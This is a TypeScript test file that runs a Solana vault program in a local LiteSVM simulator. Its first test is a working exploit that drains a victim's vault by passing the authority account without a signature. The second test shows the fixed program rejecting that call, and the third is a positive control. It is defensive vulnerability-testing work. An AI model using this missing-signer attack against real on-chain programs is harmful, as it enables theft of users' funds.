import { test } from "node:test";
import assert from "node:assert/strict";
import {
  generateKeyPairSigner,
  getProgramDerivedAddress,
  getAddressEncoder,
  type Address,
} from "@solana/kit";
import {
  LiteSVM,
  TransactionMetadata,
  FailedTransactionMetadata,
  anchorDiscriminator,
  loadProgram,
  sendIx,
  lamports,
  SOL,
} from "./harness.js";

const D = "target/deploy";
const SYSTEM_PROGRAM = "11111111111111111111111111111111" as Address;
const HALF_SOL = 500_000_000n;
const addrEncoder = getAddressEncoder();

function withdrawData(amount: bigint): Uint8Array {
  const disc = anchorDiscriminator("withdraw");
  const out = new Uint8Array(disc.length + 8);
  out.set(disc, 0);
  new DataView(out.buffer).setBigUint64(disc.length, amount, true);
  return out;
}

/** vault PDA = find_program_address([b"vault", authority], program) */
async function vaultPda(program: Address, authority: Address): Promise<Address> {
  const [pda] = await getProgramDerivedAddress({
    programAddress: program,
    seeds: [new TextEncoder().encode("vault"), addrEncoder.encode(authority)],
  });
  return pda;
}

test("EXPLOIT: attacker drains a victim's vault without the victim's signature", async () => {
  const svm = new LiteSVM();
  const vuln = await loadProgram(svm, `${D}/vault_vulnerable-keypair.json`, `${D}/vault_vulnerable.so`);

  const victim = await generateKeyPairSigner();
  const attacker = await generateKeyPairSigner();
  const recipient = await generateKeyPairSigner();
  svm.airdrop(attacker.address, lamports(SOL)); // attacker pays fees
  const vault = await vaultPda(vuln, victim.address);
  svm.airdrop(vault, lamports(SOL)); // victim's vault holds 1 SOL

  // Attacker calls withdraw passing the VICTIM's authority pubkey UNSIGNED.
  const result = await sendIx(svm, attacker, {
    programAddress: vuln,
    accounts: [
      { address: vault, role: 1 /* WRITABLE */ },
      { address: victim.address, role: 0 /* READONLY, NOT a signer */ },
      { address: recipient.address, role: 1 /* WRITABLE */ },
      { address: SYSTEM_PROGRAM, role: 0 /* READONLY */ },
    ],
    data: withdrawData(HALF_SOL),
  });

  assert.ok(
    result instanceof TransactionMetadata,
    `expected tx to succeed (exploit lands), got: ${result instanceof FailedTransactionMetadata ? result.meta().logs().join("\n") : String(result)}`,
  );
  assert.strictEqual(
    svm.getBalance(recipient.address),
    lamports(HALF_SOL),
    "attacker-controlled recipient should have received the drained lamports",
  );
});

test("DEFENSE: fixed vault rejects a withdrawal the authority did not sign", async () => {
  const svm = new LiteSVM();
  const fixed = await loadProgram(svm, `${D}/vault_fixed-keypair.json`, `${D}/vault_fixed.so`);

  const victim = await generateKeyPairSigner();
  const attacker = await generateKeyPairSigner();
  const recipient = await generateKeyPairSigner();
  svm.airdrop(attacker.address, lamports(SOL));
  const vault = await vaultPda(fixed, victim.address);
  svm.airdrop(vault, lamports(SOL));

  // Same attack against the fixed program: victim's authority is NOT a signer.
  const result = await sendIx(svm, attacker, {
    programAddress: fixed,
    accounts: [
      { address: vault, role: 1 },
      { address: victim.address, role: 0 /* not a signer */ },
      { address: recipient.address, role: 1 },
      { address: SYSTEM_PROGRAM, role: 0 },
    ],
    data: withdrawData(HALF_SOL),
  });

  assert.ok(
    result instanceof FailedTransactionMetadata,
    `expected tx to fail (defense): the authority must sign, so the drain is rejected`,
  );
});

test("POSITIVE CONTROL: the real authority withdraws from its own vault", async () => {
  const svm = new LiteSVM();
  const fixed = await loadProgram(svm, `${D}/vault_fixed-keypair.json`, `${D}/vault_fixed.so`);

  const victim = await generateKeyPairSigner();
  const recipient = await generateKeyPairSigner();
  svm.airdrop(victim.address, lamports(SOL)); // victim pays fees and signs
  const vault = await vaultPda(fixed, victim.address);
  svm.airdrop(vault, lamports(SOL));

  // The real authority (victim) signs as both fee payer and authority.
  const result = await sendIx(svm, victim, {
    programAddress: fixed,
    accounts: [
      { address: vault, role: 1 },
      { address: victim.address, role: 2 /* READONLY_SIGNER */ },
      { address: recipient.address, role: 1 },
      { address: SYSTEM_PROGRAM, role: 0 },
    ],
    data: withdrawData(HALF_SOL),
  });

  assert.ok(
    result instanceof TransactionMetadata,
    `expected tx to succeed (positive control), got: ${result instanceof FailedTransactionMetadata ? result.meta().logs().join("\n") : String(result)}`,
  );
  assert.strictEqual(
    svm.getBalance(recipient.address),
    lamports(HALF_SOL),
    "the authorized recipient should receive the withdrawal",
  );
});
